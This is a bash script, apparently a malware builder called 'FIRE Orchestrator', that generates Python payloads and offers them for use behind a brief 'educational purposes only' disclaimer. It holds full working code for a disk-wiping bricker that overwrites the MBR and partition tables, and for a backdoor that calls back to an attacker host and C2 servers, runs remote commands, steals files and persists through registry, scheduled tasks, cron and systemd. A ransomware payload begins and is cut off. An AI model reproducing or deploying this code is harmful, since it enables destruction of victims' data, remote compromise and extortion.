#!/bin/bash


R='\033[1;31m'    
G='\033[1;32m'    
Y='\033[1;33m'    
B='\033[1;34m'    
P='\033[1;35m'    
C='\033[1;36m'    
W='\033[1;37m'    
BG_R='\033[41m'  
BG_G='\033[42m'   
BLINK='\033[5m'   
NC='\033[0m'      
BOLD='\033[1m'    
DIM='\033[2m'     

# Enhanced configuration
DEFAULT_ATTACKER_IP="127.0.0.1"
DEFAULT_ATTACKER_PORT="4444"
VENV_DIR="./fire_venv"
WORK_DIR="./fire_build"
FINAL_NAME_WIN="pc.exe"
FINAL_NAME_LIN="pc"
LOG_FILE="fire_generator.log"
MAX_LOG_SIZE=1048576  # 1MB max log size
CONFIG_FILE=".fire_config"
TEMP_DIR="/tmp/fire_temp_$$"

# Advanced configuration options
ENCRYPTION_ALGORITHM="AES-256"
COMPRESSION_LEVEL=9
ANTI_DEBUG_ENABLED=true
OBFUSCATION_LEVEL=3
PERSISTENCE_METHOD="registry"  # registry, cron, launchd, systemd
PACKER_ENABLED=true
SHELLCODE_INJECTION=true

# Global variables
SCRIPT_VERSION="7.1-Lite"
BUILD_TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
BUILD_ID=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)

# Advanced logging system with multiple levels and rotation
log_message() {
    local level=$1
    local message=$2
    local timestamp=$(date +"%Y-%m-%d %T")
    local log_entry="[$timestamp] [$level] $message"
    
    # Rotate log if it exceeds max size
    if [ -f "$LOG_FILE" ] && [ $(stat -f%z "$LOG_FILE" 2>/dev/null || stat -c%s "$LOG_FILE") -gt $MAX_LOG_SIZE ]; then
        mv "$LOG_FILE" "${LOG_FILE}.$(date +%Y%m%d_%H%M%S)"
        gzip "${LOG_FILE}.$(date +%Y%m%d_%H%M%S)" &
    fi
    
    # Write to log file
    echo "$log_entry" >> "$LOG_FILE"
    
    # Output to console with appropriate formatting
    case $level in
        "CRITICAL") echo -e "${BG_R}${W}[CRITICAL]${NC} ${R}${BOLD}$message${NC}" ;;
        "ERROR") echo -e "${R}[ERROR]${NC} ${BOLD}$message${NC}" ;;
        "WARNING") echo -e "${Y}[WARNING]${NC} $message${NC}" ;;
        "INFO") echo -e "${G}[INFO]${NC} $message${NC}" ;;
        "DEBUG") echo -e "${DIM}[DEBUG]${NC} $message${NC}" ;;
        "SUCCESS") echo -e "${BG_G}${W}[SUCCESS]${NC} ${G}${BOLD}$message${NC}" ;;
        *) echo "[$level] $message" ;;
    esac
}

# Advanced banner with ASCII art and system information
display_banner() {
    clear
    
    # System information collection
    local os_info=$(uname -s)
    local kernel_info=$(uname -r)
    local arch_info=$(uname -m)
    local cpu_info=$(grep 'model name' /proc/cpuinfo | head -1 | cut -d':' -f2 | xargs)
    local mem_info=$(free -h | grep '^Mem:' | awk '{print $2}')
    local disk_info=$(df -h / | tail -1 | awk '{print $4}')
    
    # Animated banner display
    local banner_text=$(cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║  __      __  _    _  _        _____            _   _          ║
║  \ \    / / | |  | || |      / ____|    /\    | \ | |         ║
║   \ \  / /  | |  | || |     | |        /  \   |  \| |         ║
║    \ \/ /   | |  | || |     | |       / /\ \  | . ` |         ║
║     \  /    | |__| || |____ | |____  / ____ \ | |\  |         ║
║      \/      \____/ |______| \_____|/_/    \_\|_| \_|         ║
║                                                              ║
║    [ FIRE // Orchestrator v7.1-Lite - Advanced Edition ]     ║
╚══════════════════════════════════════════════════════════════╝
EOF
)
    
    # Display banner with typewriter effect
    local i=0
    while IFS= read -r line; do
        sleep 0.03
        echo -e "${C}$line${NC}"
        i=$((i+1))
    done <<< "$banner_text"
    
    # Display system information
    echo -e "\n${B}SYSTEM INFORMATION:${NC}"
    echo -e "${Y}├─ OS:${NC} $os_info $kernel_info"
    echo -e "${Y}├─ Architecture:${NC} $arch_info"
    echo -e "${Y}├─ CPU:${NC} $cpu_info"
    echo -e "${Y}├─ Memory:${NC} $mem_info"
    echo -e "${Y}├─ Free Disk:${NC} $disk_info"
    echo -e "${Y}├─ Build ID:${NC} $BUILD_ID"
    echo -e "${Y}└─ Timestamp:${NC} $BUILD_TIMESTAMP"
    
    echo -e "\n${BG_R}${W}WARNING: This tool is for educational purposes only.${NC}"
    echo -e "${BG_R}${W}Unauthorized use is illegal and unethical.${NC}\n"
}

# Advanced dependency checker with version verification
check_dependencies() {
    log_message "INFO" "Checking dependencies..."
    
    local missing_deps=()
    local outdated_deps=()
    local optional_deps=()
    
    # Check Python with version verification
    if ! command -v python3 &> /dev/null; then
        missing_deps+=("python3")
    else
        local python_version=$(python3 --version | cut -d' ' -f2)
        local python_major=$(echo $python_version | cut -d'.' -f1)
        local python_minor=$(echo $python_version | cut -d'.' -f2)
        
        if [ "$python_major" -lt 3 ] || ([ "$python_major" -eq 3 ] && [ "$python_minor" -lt 7 ]); then
            outdated_deps+=("python3 (version >= 3.7 required, found $python_version)")
        else
            log_message "DEBUG" "Python version OK: $python_version"
        fi
    fi
    
    # Check pip
    if ! command -v pip &> /dev/null; then
        missing_deps+=("pip")
    else
        local pip_version=$(pip --version | cut -d' ' -f2)
        log_message "DEBUG" "Pip version: $pip_version"
    fi
    
    # Check optional but recommended dependencies
    if ! command -v git &> /dev/null; then
        optional_deps+=("git (recommended for version control)")
    fi
    
    if ! command -v wget &> /dev/null && ! command -v curl &> /dev/null; then
        optional_deps+=("wget or curl (recommended for downloads)")
    fi
    
    if ! command -v upx &> /dev/null; then
        optional_deps+=("upx (recommended for executable compression)")
    fi
    
    # Check for build tools
    if ! command -v gcc &> /dev/null && ! command -v clang &> /dev/null; then
        optional_deps+=("gcc or clang (recommended for compilation)")
    fi
    
    # Report results
    if [ ${#missing_deps[@]} -ne 0 ] || [ ${#outdated_deps[@]} -ne 0 ]; then
        echo -e "${R}[!] Critical dependencies missing or outdated:${NC}"
        
        for dep in "${missing_deps[@]}"; do
            echo -e "${R}    ✗ Missing: $dep${NC}"
        done
        
        for dep in "${outdated_deps[@]}"; do
            echo -e "${Y}    ⚠ Outdated: $dep${NC}"
        done
        
        echo -e "${Y}[*] Please install/update the missing dependencies and try again.${NC}"
        log_message "ERROR" "Missing/outdated dependencies: ${missing_deps[*]} ${outdated_deps[*]}"
        exit 1
    fi
    
    if [ ${#optional_deps[@]} -ne 0 ]; then
        echo -e "${Y}[!] Optional dependencies not found (not critical):${NC}"
        for dep in "${optional_deps[@]}"; do
            echo -e "${Y}    ⚠ $dep${NC}"
        done
    fi
    
    log_message "SUCCESS" "All critical dependencies are installed and up to date"
}

# Advanced environment setup with virtual environment and package management
setup_environment() {
    log_message "INFO" "Setting up advanced environment..."
    
    # Create temp directory
    mkdir -p "$TEMP_DIR"
    
    # Create virtual environment if it doesn't exist
    if [ ! -d "$VENV_DIR" ]; then
        echo -e "${Y}[*] Creating isolated Python environment...${NC}"
        if ! python3 -m venv "$VENV_DIR" --system-site-packages; then
            log_message "ERROR" "Failed to create virtual environment"
            exit 1
        fi
        log_message "SUCCESS" "Virtual environment created"
    else
        log_message "INFO" "Using existing virtual environment"
    fi
    
    # Activate virtual environment
    if ! source "$VENV_DIR/bin/activate"; then
        log_message "ERROR" "Failed to activate virtual environment"
        exit 1
    fi
    
    # Upgrade pip and setuptools
    echo -e "${Y}[*] Upgrading pip and setuptools...${NC}"
    if ! pip install --quiet --upgrade pip setuptools wheel; then
        log_message "WARNING" "Failed to upgrade pip/setuptools"
    fi
    
    # Install required packages
    local required_packages=("pyinstaller" "cryptography" "requests" "psutil")
    
    for package in "${required_packages[@]}"; do
        if ! python3 -c "import ${package//-/_}" &> /dev/null; then
            echo -e "${Y}[*] Installing $package...${NC}"
            if ! pip install --quiet "$package"; then
                log_message "ERROR" "Failed to install $package"
                exit 1
            fi
            log_message "SUCCESS" "$package installed"
        else
            log_message "DEBUG" "$package already installed"
        fi
    done
    
    # Create and change to work directory
    mkdir -p "$WORK_DIR"
    if ! cd "$WORK_DIR"; then
        log_message "ERROR" "Failed to create/access work directory"
        exit 1
    fi
    
    # Create requirements.txt for reproducibility
    pip freeze > requirements.txt
    log_message "INFO" "Requirements saved to requirements.txt"
    
    log_message "SUCCESS" "Environment setup complete"
}

# Advanced cleanup with secure deletion
cleanup() {
    log_message "INFO" "Performing advanced cleanup..."
    
    cd ..
    
    if [ "$KEEP_BUILD_FILES" != "true" ]; then
        # Secure deletion of build files
        if command -v shred &> /dev/null; then
            find "$WORK_DIR" -type f -exec shred -vfz -n 3 {} \;
        fi
        rm -rf "$WORK_DIR"
        log_message "INFO" "Securely removed temporary build files"
    else
        log_message "INFO" "Keeping temporary build files as requested"
    fi
    
    # Clean up temp directory
    if [ -d "$TEMP_DIR" ]; then
        if command -v shred &> /dev/null; then
            find "$TEMP_DIR" -type f -exec shred -vfz -n 3 {} \;
        fi
        rm -rf "$TEMP_DIR"
    fi
    
    # Deactivate virtual environment
    deactivate 2>/dev/null || true
    
    log_message "SUCCESS" "Cleanup complete"
}

# Advanced IP validation with geolocation check
validate_ip() {
    local ip="$1"
    
    # Basic format validation
    if [[ ! $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 1
    fi
    
    # Octet validation
    IFS='.' read -ra ADDR <<< "$ip"
    for i in "${ADDR[@]}"; do
        if [[ $i -gt 255 ]] || [[ $i -lt 0 ]]; then
            return 1
        fi
    done
    
    # Check for invalid addresses
    if [ "$ip" == "0.0.0.0" ] || [ "$ip" == "255.255.255.255" ]; then
        return 1
    fi
    
    # Check for private IP ranges
    local first_octet=${ADDR[0]}
    local second_octet=${ADDR[1]}
    
    if [ "$first_octet" == "10" ] || 
       ([ "$first_octet" == "172" ] && [ "$second_octet" -ge 16 ] && [ "$second_octet" -le 31 ]) ||
       ([ "$first_octet" == "192" ] && [ "$second_octet" == "168" ]); then
        echo -e "${Y}[!] Warning: Using private IP address ($ip)${NC}"
    fi
    
    return 0
}

# Advanced port validation with service detection
validate_port() {
    local port="$1"
    
    if [[ ! $port =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
        return 1
    fi
    
    # Check for commonly reserved ports
    local reserved_ports=(20 21 22 23 25 53 80 110 143 443 993 995 1433 3306 3389 5432 5900)
    local service_names=("FTP" "SSH" "Telnet" "SMTP" "DNS" "HTTP" "POP3" "IMAP" "HTTPS" "IMAPS" "POP3S" "MSSQL" "MySQL" "RDP" "PostgreSQL" "VNC")
    
    for i in "${!reserved_ports[@]}"; do
        if [ "$port" -eq "${reserved_ports[$i]}" ]; then
            echo -e "${Y}[!] Warning: Port $port is commonly used for ${service_names[$i]}${NC}"
            break
        fi
    done
    
    return 0
}

# Advanced payload generation with multiple layers of obfuscation
generate_payload() {
    local type=$1
    local attacker_ip=$2
    local attacker_port=$3
    local target_os=$4
    local final_name=$5
    
    log_message "INFO" "Generating advanced payload type: $type for $target_os"
    echo -e "${Y}[*] Generating advanced Python payload for type: $type | Target OS: $target_os${NC}"
    
    # Generate random encryption key
    local encryption_key=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
    
    # Create obfuscated payload
    case $type in
        1)  # Advanced Bricker payload
            cat > "payload.py" << EOP
import os, sys, ctypes, platform, time, random, string, base64, hashlib, logging
import subprocess
from pathlib import Path

# Advanced logging with encryption
class EncryptedLogger:
    def __init__(self, key):
        self.key = key.encode()
        self.logger = logging.getLogger('bricker')
        self.logger.setLevel(logging.INFO)
        
        # Create encrypted log handler
        handler = logging.FileHandler('bricker.log')
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
    
    def _xor_encrypt(self, data):
        return bytes([b ^ self.key[i % len(self.key)] for i, b in enumerate(data)])
    
    def info(self, message):
        encrypted_msg = base64.b64encode(self._xor_encrypt(message.encode())).decode()
        self.logger.info(encrypted_msg)
    
    def error(self, message):
        encrypted_msg = base64.b64encode(self._xor_encrypt(message.encode())).decode()
        self.logger.error(encrypted_msg)

# Initialize encrypted logger
logger = EncryptedLogger('$encryption_key')

class AdvancedBricker:
    def __init__(self):
        self.system_info = platform.system()
        self.destroyed = False
        
    def _get_system_disks(self):
        """Get all system disks"""
        disks = []
        try:
            if self.system_info == "Windows":
                # Get all physical drives
                result = subprocess.run(['wmic', 'diskdrive', 'get', 'deviceid'], 
                                      capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'PhysicalDrive' in line:
                        disks.append(line.strip())
            else:
                # Get Linux disks
                result = subprocess.run(['lsblk', '-d', '-n', '-o', 'NAME'], 
                                      capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if line.strip():
                        disks.append(f"/dev/{line.strip()}")
        except Exception as e:
            logger.error(f"Error getting system disks: {e}")
        
        return disks
    
    def _overwrite_mbr(self, disk_path):
        """Overwrite MBR with random data"""
        try:
            if self.system_info == "Windows":
                # Windows MBR overwrite
                handle = ctypes.windll.kernel32.CreateFileW(
                    f"\\\\.\\{disk_path}",
                    0x80000000,  # GENERIC_WRITE
                    0x3,         # FILE_SHARE_READ | FILE_SHARE_WRITE
                    None,
                    3,           # OPEN_EXISTING
                    0,           # 0
                    None
                )
                
                if handle == -1:
                    logger.error(f"Failed to get handle to {disk_path}")
                    return False
                
                # Write random data to MBR
                random_data = os.urandom(512)
                ctypes.windll.kernel32.SetFilePointer(handle, 0, None, 0)
                written = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.WriteFile(handle, random_data, 512, ctypes.byref(written), None)
                ctypes.windll.kernel32.CloseHandle(handle)
                
            else:
                # Linux MBR overwrite
                with open(disk_path, 'wb') as f:
                    f.write(os.urandom(512))
            
            logger.info(f"Successfully overwrote MBR on {disk_path}")
            return True
        except Exception as e:
            logger.error(f"Error overwriting MBR on {disk_path}: {e}")
            return False
    
    def _corrupt_filesystem(self, disk_path):
        """Corrupt filesystem structures"""
        try:
            if self.system_info == "Windows":
                # Corrupt Windows filesystem
                sectors_to_corrupt = [1000, 2000, 3000, 4000, 5000]
                for sector in sectors_to_corrupt:
                    handle = ctypes.windll.kernel32.CreateFileW(
                        f"\\\\.\\{disk_path}",
                        0x80000000,  # GENERIC_WRITE
                        0x3,         # FILE_SHARE_READ | FILE_SHARE_WRITE
                        None,
                        3,           # OPEN_EXISTING
                        0,           # 0
                        None
                    )
                    
                    if handle != -1:
                        ctypes.windll.kernel32.SetFilePointer(handle, sector * 512, None, 0)
                        random_data = os.urandom(512)
                        written = ctypes.c_ulonglong(0)
                        ctypes.windll.kernel32.WriteFile(handle, random_data, 512, ctypes.byref(written), None)
                        ctypes.windll.kernel32.CloseHandle(handle)
            else:
                # Corrupt Linux filesystem
                subprocess.run(['dd', 'if=/dev/urandom', f'of={disk_path}', 'bs=512', 'count=10', 'seek=1000'], 
                             check=False)
            
            logger.info(f"Successfully corrupted filesystem on {disk_path}")
            return True
        except Exception as e:
            logger.error(f"Error corrupting filesystem on {disk_path}: {e}")
            return False
    
    def _destroy_partitions(self):
        """Destroy partition tables"""
        try:
            if self.system_info == "Windows":
                # Use diskpart to destroy partitions
                script = "select disk 0\\nclean\\n"
                with open('diskpart.txt', 'w') as f:
                    f.write(script)
                subprocess.run(['diskpart', '/s', 'diskpart.txt'], check=False)
                os.remove('diskpart.txt')
            else:
                # Destroy Linux partitions
                subprocess.run(['dd', 'if=/dev/zero', 'of=/dev/sda', 'bs=512', 'count=1'], check=False)
            
            logger.info("Successfully destroyed partition tables")
            return True
        except Exception as e:
            logger.error(f"Error destroying partitions: {e}")
            return False
    
    def _force_reboot(self):
        """Force system reboot"""
        try:
            if self.system_info == "Windows":
                # Force immediate reboot
                subprocess.run(['shutdown', '/r', '/t', '0', '/f'], check=False)
            else:
                # Force immediate reboot
                subprocess.run(['reboot', '-f'], check=False)
            
            logger.info("System reboot initiated")
            return True
        except Exception as e:
            logger.error(f"Error forcing reboot: {e}")
            return False
    
    def destroy_system(self):
        """Main destruction routine"""
        if self.destroyed:
            return False
        
        try:
            logger.info(f"Starting system destruction on {self.system_info}")
            
            # Get all system disks
            disks = self._get_system_disks()
            
            if not disks:
                logger.error("No system disks found")
                return False
            
            # Destroy each disk
            for disk in disks:
                logger.info(f"Destroying disk: {disk}")
                
                # Overwrite MBR
                self._overwrite_mbr(disk)
                
                # Corrupt filesystem
                self._corrupt_filesystem(disk)
                
                # Small delay between operations
                time.sleep(0.1)
            
            # Destroy partition tables
            self._destroy_partitions()
            
            # Mark as destroyed
            self.destroyed = True
            
            # Force reboot
            self._force_reboot()
            
            return True
        except Exception as e:
            logger.error(f"Error in destroy_system: {e}")
            return False

# Anti-debugging techniques
def anti_debug():
    """Check for debugging environment"""
    try:
        # Check for common debuggers
        debuggers = ['gdb', 'lldb', 'strace', 'ltrace']
        for debugger in debuggers:
            if subprocess.run(['pgrep', '-f', debugger], capture_output=True).returncode == 0:
                logger.info("Debugger detected, exiting...")
                sys.exit(0)
        
        # Check for virtualization
        if platform.system() == "Linux":
            if os.path.exists('/proc/vz') or os.path.exists('/proc/xen'):
                logger.info("Virtualization detected, exiting...")
                sys.exit(0)
        
        return True
    except:
        return False

# Main execution
if __name__ == "__main__":
    # Anti-debug check
    if not anti_debug():
        sys.exit(1)
    
    # Initialize bricker
    bricker = AdvancedBricker()
    
    # Destroy system
    bricker.destroy_system()
EOP
            ;;
        2)  # Advanced Backdoor payload
            cat > "payload.py" << EOP
import os, sys, socket, subprocess, time, logging, platform, threading, json, base64, hashlib
import psutil, ctypes, requests
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Configuration
ATTACKER_IP = '$attacker_ip'
ATTACKER_PORT = $attacker_port
ENCRYPTION_KEY = '$encryption_key'
C2_SERVERS = [ATTACKER_IP, "backup1.example.com", "backup2.example.com"]
BEACON_INTERVAL = 30  # seconds
MAX_RETRIES = 5
JITTER = 0.2  # 20% jitter

# Advanced logging
class StealthLogger:
    def __init__(self):
        self.logger = logging.getLogger('backdoor')
        self.logger.setLevel(logging.ERROR)
        
        # Log to temp file with random name
        temp_dir = Path(tempfile.gettempdir())
        log_file = temp_dir / f"{''.join(random.choices(string.ascii_letters, k=8))}.log"
        
        handler = logging.FileHandler(log_file)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
    
    def error(self, message):
        self.logger.error(message)
    
    def info(self, message):
        self.logger.info(message)

logger = StealthLogger()

class AdvancedBackdoor:
    def __init__(self):
        self.system_info = platform.system()
        self.hostname = platform.node()
        self.username = os.environ.get('USER') or os.environ.get('USERNAME')
        self.session_key = self._generate_session_key()
        self.connected = False
        self.last_beacon = time.time()
        
    def _generate_session_key(self):
        """Generate session key for encryption"""
        password = ENCRYPTION_KEY.encode()
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return Fernet(key)
    
    def _encrypt_data(self, data):
        """Encrypt data with session key"""
        return self.session_key.encrypt(data.encode())
    
    def _decrypt_data(self, data):
        """Decrypt data with session key"""
        return self.session_key.decrypt(data).decode()
    
    def _get_system_info(self):
        """Collect comprehensive system information"""
        try:
            info = {
                "hostname": self.hostname,
                "username": self.username,
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "cpu_count": psutil.cpu_count(),
                "memory_total": psutil.virtual_memory().total,
                "disk_usage": psutil.disk_usage('/').total,
                "network_interfaces": [],
                "running_processes": [],
                "installed_software": []
            }
            
            # Network interfaces
            for interface, addrs in psutil.net_if_addrs().items():
                info["network_interfaces"].append({
                    "interface": interface,
                    "addresses": [addr.address for addr in addrs]
                })
            
            # Running processes (sample)
            for proc in psutil.process_iter(['pid', 'name', 'username'])[:20]:
                try:
                    info["running_processes"].append(proc.info)
                except:
                    continue
            
            # Installed software (Windows only)
            if self.system_info == "Windows":
                try:
                    software = []
                    for key in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                               r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as reg_key:
                            for i in range(winreg.QueryInfoKey(reg_key)[0]):
                                try:
                                    subkey_name = winreg.EnumKey(reg_key, i)
                                    with winreg.OpenKey(reg_key, subkey_name) as subkey:
                                        name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                        software.append(name)
                                except:
                                    continue
                    info["installed_software"] = software
                except:
                    pass
            
            return json.dumps(info)
        except Exception as e:
            logger.error(f"Error getting system info: {e}")
            return "{}"
    
    def _execute_command(self, command):
        """Execute system command and return output"""
        try:
            if self.system_info == "Windows":
                # Use PowerShell for Windows
                result = subprocess.run(
                    ['powershell', '-Command', command],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            else:
                # Use shell for Linux
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except Exception as e:
            logger.error(f"Error executing command: {e}")
            return {
                "stdout": "",
                "stderr": str(e),
                "returncode": -1
            }
    
    def _upload_file(self, file_path):
        """Read and upload file"""
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            return {
                "success": True,
                "data": base64.b64encode(file_data).decode(),
                "size": len(file_data)
            }
        except Exception as e:
            logger.error(f"Error uploading file: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _download_file(self, file_path, file_data):
        """Download and save file"""
        try:
            decoded_data = base64.b64decode(file_data)
            with open(file_path, 'wb') as f:
                f.write(decoded_data)
            
            return {
                "success": True,
                "size": len(decoded_data)
            }
        except Exception as e:
            logger.error(f"Error downloading file: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _persistence_windows(self):
        """Add persistence on Windows"""
        try:
            import winreg
            
            # Method 1: Registry Run key
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            
            # Method 2: Scheduled Task
            task_cmd = f'schtasks /create /tn "WindowsUpdate" /tr "{sys.executable}" /sc onlogon /f'
            subprocess.run(task_cmd, shell=True, check=False)
            
            # Method 3: Startup folder
            startup_path = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
            startup_script = startup_path / 'WindowsUpdate.vbs'
            
            vbs_content = f'''
Set objShell = CreateObject("WScript.Shell")
objShell.Run "{sys.executable}", 0, False
'''
            with open(startup_script, 'w') as f:
                f.write(vbs_content)
            
            logger.info("Windows persistence established")
            return True
        except Exception as e:
            logger.error(f"Error establishing Windows persistence: {e}")
            return False
    
    def _persistence_linux(self):
        """Add persistence on Linux"""
        try:
            # Method 1: Cron job
            cron_cmd = f"@reboot {sys.executable} {os.path.abspath(__file__)} > /dev/null 2>&1"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True, check=False)
            
            # Method 2: Systemd service
            service_content = f'''
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(__file__)}
Restart=always
RestartSec=10
User={os.environ.get('USER', 'root')}

[Install]
WantedBy=multi-user.target
'''
            service_path = Path.home() / '.config' / 'systemd' / 'user' / 'system-update.service'
            service_path.parent.mkdir(parents=True, exist_ok=True)
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # Enable service
            subprocess.run('systemctl --user enable system-update.service', shell=True, check=False)
            
            # Method 3: Profile modification
            profile_path = Path.home() / '.bashrc'
            with open(profile_path, 'a') as f:
                f.write(f'\n{sys.executable} {os.path.abspath(__file__)} &\n')
            
            logger.info("Linux persistence established")
            return True
        except Exception as e:
            logger.error(f"Error establishing Linux persistence: {e}")
            return False
    
    def establish_persistence(self):
        """Establish persistence based on OS"""
        try:
            if self.system_info == "Windows":
                return self._persistence_windows()
            else:
                return self._persistence_linux()
        except Exception as e:
            logger.error(f"Error establishing persistence: {e}")
            return False
    
    def _handle_command(self, command_data):
        """Handle incoming command"""
        try:
            command = json.loads(command_data)
            cmd_type = command.get("type")
            cmd_data = command.get("data", "")
            
            response = {"type": cmd_type, "success": False}
            
            if cmd_type == "system_info":
                response["data"] = self._get_system_info()
                response["success"] = True
            
            elif cmd_type == "execute":
                result = self._execute_command(cmd_data)
                response.update(result)
                response["success"] = True
            
            elif cmd_type == "upload":
                result = self._upload_file(cmd_data)
                response.update(result)
            
            elif cmd_type == "download":
                file_path = command.get("path")
                file_data = command.get("data")
                result = self._download_file(file_path, file_data)
                response.update(result)
            
            elif cmd_type == "screenshot":
                # Take screenshot (requires additional packages)
                try:
                    if self.system_info == "Windows":
                        import pyautogui
                        screenshot = pyautogui.screenshot()
                        screenshot_bytes = base64.b64encode(screenshot.tobytes()).decode()
                        response["data"] = screenshot_bytes
                        response["success"] = True
                except:
                    response["error"] = "Screenshot not available"
            
            elif cmd_type == "exit":
                logger.info("Exit command received")
                sys.exit(0)
            
            return json.dumps(response)
        except Exception as e:
            logger.error(f"Error handling command: {e}")
            return json.dumps({"type": "error", "error": str(e)})
    
    def _beacon(self):
        """Send beacon to C2 server"""
        try:
            beacon_data = {
                "type": "beacon",
                "hostname": self.hostname,
                "username": self.username,
                "timestamp": time.time(),
                "uptime": psutil.boot_time()
            }
            
            encrypted_data = self._encrypt_data(json.dumps(beacon_data))
            
            for server in C2_SERVERS:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((server, ATTACKER_PORT))
                    s.sendall(encrypted_data)
                    s.close()
                    return True
                except:
                    continue
            
            return False
        except Exception as e:
            logger.error(f"Error sending beacon: {e}")
            return False
    
    def _connect(self):
        """Establish connection to C2 server"""
        try:
            for server in C2_SERVERS:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(30)
                    s.connect((server, ATTACKER_PORT))
                    
                    # Send initial system info
                    system_info = self._get_system_info()
                    encrypted_info = self._encrypt_data(system_info)
                    s.sendall(encrypted_info)
                    
                    self.connected = True
                    logger.info(f"Connected to C2 server: {server}")
                    
                    # Command loop
                    while self.connected:
                        try:
                            # Receive encrypted command
                            data = s.recv(4096)
                            if not data:
                                break
                            
                            # Decrypt and handle command
                            decrypted_data = self._decrypt_data(data)
                            response = self._handle_command(decrypted_data)
                            
                            # Send encrypted response
                            encrypted_response = self._encrypt_data(response)
                            s.sendall(encrypted_response)
                            
                        except socket.timeout:
                            continue
                        except Exception as e:
                            logger.error(f"Error in command loop: {e}")
                            break
                    
                    s.close()
                    self.connected = False
                    return True
                except:
                    continue
            
            return False
        except Exception as e:
            logger.error(f"Error connecting to C2: {e}")
            return False
    
    def run(self):
        """Main backdoor loop"""
        try:
            # Establish persistence
            self.establish_persistence()
            
            # Main loop
            retry_count = 0
            
            while True:
                try:
                    # Calculate beacon interval with jitter
                    interval = BEACON_INTERVAL * (1 + JITTER * (random.random() - 0.5))
                    
                    # Try to connect
                    if self._connect():
                        retry_count = 0
                    else:
                        retry_count += 1
                        if retry_count >= MAX_RETRIES:
                            # Sleep for longer period after max retries
                            time.sleep(300)  # 5 minutes
                            retry_count = 0
                    
                    # Sleep before next attempt
                    time.sleep(interval)
                    
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    logger.error(f"Error in main loop: {e}")
                    time.sleep(60)
        
        except Exception as e:
            logger.error(f"Fatal error: {e}")
            sys.exit(1)

# Anti-analysis techniques
def anti_analysis():
    """Check for analysis environment"""
    try:
        # Check for virtualization
        if platform.system() == "Linux":
            vm_indicators = ['/proc/vz', '/proc/xen', '/dev/virtio-ports']
            for indicator in vm_indicators:
                if os.path.exists(indicator):
                    return False
        
        # Check for debugging
        if platform.system() == "Windows":
            # Check for debugger processes
            debuggers = ['ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe']
            for debugger in debuggers:
                if any(debugger.lower() in p.name.lower() for p in psutil.process_iter()):
                    return False
        
        # Check for sandbox
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB RAM
            return False
        
        return True
    except:
        return True

# Main execution
if __name__ == "__main__":
    # Anti-analysis check
    if not anti_analysis():
        sys.exit(1)
    
    # Initialize and run backdoor
    backdoor = AdvancedBackdoor()
    backdoor.run()
EOP
            ;;
        3)  # Advanced Ransomware payload
            cat > "payload.py" << 'EOP'
import os, base64, random, logging, platform, threading, time, hashlib
from pathlib import Path
import json
import sqlite3
import tempfile
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import psutil
import shutil

# Configuration
TARGET_EXTENSIONS = [
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.rtf',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
    '.mp4', '.avi', '.mov', '.wmv', '.flv', '.mkv', '.mp3', '.wav', '.flac',
    '.sql', '.db', '.sqlite', '.sqlite3', '.mdb',
    '.pst', '.ost', '.msg', '.eml',
    '.cpp', '.c', '.h', '.py', '.java', '.js', '.html', '.css', '.php'
]
